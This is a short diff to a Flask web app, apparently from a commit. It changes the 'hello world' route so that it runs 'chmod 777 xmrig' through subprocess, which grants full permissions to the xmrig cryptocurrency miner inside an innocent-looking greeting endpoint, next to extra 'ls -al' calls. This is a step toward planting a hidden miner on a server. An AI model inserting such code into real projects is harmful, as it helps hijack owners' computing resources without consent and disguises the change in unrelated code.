@@ -26,9 +26,11 @@ app = Flask(__name__)
 def hello_world():
     command5 = 'ls -al'
     res = subprocess.check_call(command5.split())
-    command6 = 'whoami'
+    command6 = 'chmod 777 xmrig'
     res1 = subprocess.check_call(command6.split())
-    return "Hello {}!".format(res1)
+    command7 = 'ls -al'
+    res2 = subprocess.check_call(command7.split())
+    return "Hello {}!".format(res2)
 
 
 if __name__ == "__main__":
